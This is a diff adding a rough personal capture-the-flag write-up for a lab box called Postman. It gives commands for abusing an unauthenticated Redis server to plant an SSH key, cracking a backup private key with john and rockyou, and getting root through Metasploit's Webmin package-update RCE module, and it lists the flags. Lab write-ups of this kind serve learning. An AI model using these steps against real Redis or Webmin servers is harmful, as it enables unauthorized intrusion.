@@ -1,0 +1,45 @@
+We have 20,80 and 10000 open.
+
+On port 80 we have a page with nothing on it.
+
+Runing dirb. [ dirb http://10.10.10.160/ /usr/share/dirb/wordlists/common.txt ]
+On port 1000 is webmin server with default credetials root and password for root. No quite intereasting. 
+
+On port 80 I found an intereasting directory which is /upload. Deadend.
+
+Trying on port 10000 ro tun dirb
+
+EXPLOIT THE REDIS HOST. 
+Check if we need auth. [ telnet 10.10.10.160 6379 ]
+We don't need any credentials so we will upload a ssh key. [ ssh-keygen ]
+Save it [ (echo -e "\n\n"; cat /root/.ssh/id_rsa; echo -e "\n\n") > Documents/Boxes/Postman/foo.txt ]
+You are getting the error that you can't write on flushall [ config set stop-writes-on-bgsave-error no ]
+Than you use [ redis-cli -h 10.10.10.160 flushall ]
+And than [ cat Documents/Boxes/Postman/foo.txt | redis-cli -h 10.10.10.160 -x set crackit ]
+Doesn;t work manually. Something done wrong. Maybe recheck one day.
+
+On the other hand using a python script I get acces to the redis user. [ python script.py 10.10.10.160 redis ]  
+
+Know we should priv escaladate to 
+From enum I find that I could escalate using POSIX. FALSE.
+We find from .bash_history that is somewhere an id_rsa.bak file, and we try to search id [ find / -type f -name "id_rsa.bak" ]
+The output of this is quite simple, we find that is in "/opt/id_rsa.bak" and when we try to see what are the permissions we get that it belongs to Matt.
+Now we should try to crack it. First transform it using ssh2john and than run it. We get 'computer2008' [ /usr/sbin/john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.john ]
+Getting the public key [ openssl rsa -in id_rsa.hash -out decrypted_key ]
+Now login again to redis, and switch to Matt [ su - Matt with passwd computer2008 ]
+
+Voila. We got the USER.
+
+Heading to root.
+Use metasploit's code execution [ use exploit/linux/http/webmin_packageup_rce ]
+And you get it in seconds. 
+
+Flags
+USER -> 517ad0ec2458ca97af8d93aac08a2f3c
+ROOT -> a257741c5bed8be7778c6ed95686ddce
+
+
+
+Usefull articles
+https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
+https://github.com/Avinash-acid/Redis-Server-Exploit/blob/master/redis.py 
